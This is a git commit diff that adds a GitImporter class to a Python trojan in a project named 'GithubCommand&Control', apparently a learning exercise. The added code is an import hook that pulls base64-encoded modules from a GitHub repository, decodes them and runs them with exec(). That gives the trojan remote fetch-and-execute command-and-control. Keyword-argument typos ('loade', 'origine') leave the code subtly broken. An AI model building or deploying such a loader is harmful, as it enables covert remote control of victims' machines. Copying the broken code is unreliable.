cbc38fb4f53c3789506bacb1a75b1e0456dd92d6
AnLau25 <avald024@uottawa.ca>
2025-06-19 18:48:29 -0400

    GitImporter

--- GithubCommand&Control/git_trojan.py
+++ GithubCommand&Control/git_trojan.py
@@ -1,4 +1,5 @@
 import base64
+import importlib.util
 import github3
 import importlib
 import json
@@ -63,3 +64,21 @@ class Trojan:
                 
             time.sleep(random.randint(30*60, 3*60*60))
 
+class GitImporter:
+    def __init__(self):
+        self.current_module_code = ""
+    
+    def find_module(self, name, path = None):
+        print("[*] Attempting to retrive %s" % name)
+        self.repo = github_connect()
+        new_library = get_file_contents('modules', f'{name}.py', self.repo)
+        if new_library is not None:
+            self.current_module_code = base64.b64decode(new_library)
+            return self
+    
+    def load_module(self, name):
+        spec = importlib.util.spec_from_loader(name, loade=None, origine=self.repo.git_url)
+        new_module = importlib.util.module_from_spec(spec)
+        exec(self.current_module_code, new_module.__dict__)
+        sys.modules[spec.name] = new_module
+        return new_module
